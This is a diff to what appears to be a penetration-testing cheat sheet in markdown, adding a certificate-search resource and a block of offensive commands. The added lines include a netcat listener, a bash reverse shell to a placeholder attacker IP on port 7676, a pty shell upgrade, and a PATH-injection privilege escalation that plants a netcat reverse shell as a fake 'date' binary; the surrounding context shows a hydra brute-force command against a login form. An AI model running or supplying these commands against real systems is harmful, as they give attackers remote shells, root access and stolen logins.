@@ -38,6 +38,9 @@ CVE Mitre
 * The Wayback Machine - https://archive.org/web/
   A historical archive of websites that dates back to the late 90s
 
+*  https://crt.sh and https://transparencyreport.google.com/https/certificates
+  Offer a searchable database of certificates that shows current and historical results
+
 
 # Usage examples
 
@@ -84,6 +87,9 @@ Post against a web form
 hydra -l <username> -P <wordlist> <DOMAIN/IP> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 ```
 
+### Hashcat
+
+hashcat
 
 ## More notes
 
@@ -93,3 +99,35 @@ hydra -l <username> -P <wordlist> <DOMAIN/IP> http-post-form "/:username=^USER^&
 puttygen KEYFILE -o OUTPUT_KEY.ppk
 ```
 
+
+### Other
+
+```bash
+nc -vnlp 7676
+```
+
+```bash
+/bin/bash -c 'bash -i > /dev/tcp/<INSERT_YOUR_IP>/7676 0>&1'
+```
+
+#### Shell
+
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+### Privilege escalation
+
+Check sudo permissions
+
+```bash
+sudo -l
+```
+
+path injection example
+
+```bash
+echo "nc <INSERT_YOUR_IP> 7676 -e /bin/bash" > /tmp/date
+chmod 777 /tmp/date
+export PATH=/tmp/:$PATH
+```
